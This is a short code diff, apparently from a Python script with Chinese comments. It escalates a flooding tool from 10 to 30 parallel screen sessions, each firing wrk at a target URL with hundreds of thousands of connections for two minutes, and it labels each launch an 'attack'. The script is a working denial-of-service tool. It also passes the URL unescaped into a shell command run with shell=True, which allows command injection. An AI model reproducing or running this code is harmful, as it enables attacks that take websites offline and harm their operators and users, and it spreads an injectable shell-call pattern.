@@ -17,11 +17,11 @@ def generate_screen_name():
     return "screen_" + ''.join(random.choices(string.ascii_letters + string.digits, k=8))
 
 def execute_wrk(url):
-    """启动 10 个不同的 screen 会话，每个会话执行一次 wrk 命令"""
+    """启动 30 个不同的 screen 会话，每个会话执行一次 wrk 命令"""
     results = []
-    for i in range(10):
+    for i in range(30):
         screen_name = generate_screen_name()
-        command = f"screen -dmS {screen_name} bash -c 'ulimit -n 1000000 && wrk -t200000 -c400000 -d120s {url}'"
+        command = f"screen -dmS {screen_name} bash -c 'ulimit -n 1000000 && wrk -t50000 -c400000 -d120s {url}'"
         try:
             subprocess.run(command, shell=True, check=True)
             results.append(f"Started attack in screen session: {screen_name}")
